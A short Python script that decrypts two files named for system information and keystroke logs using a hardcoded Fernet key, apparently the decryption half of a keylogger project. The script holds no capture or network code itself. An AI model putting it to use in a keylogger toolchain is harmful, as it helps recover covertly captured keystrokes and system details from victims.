from cryptography.fernet import Fernet

key = "Ze8g6DapTBMCpx5bbOWT8yw3eGOzebxFCV3YxeCWGWc="

e_sys_info = "e_sys_info.txt"
e_key_logs = "e_key_logs.txt"

encrypted_files = [e_sys_info, e_key_logs]
count = 0
for decrypting_file in encrypted_files:
    with open(encrypted_files[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    dectypted = fernet.decrypt(data)

    with open(encrypted_files[count], 'wb') as f:
        f.write(dectypted)
    count += 1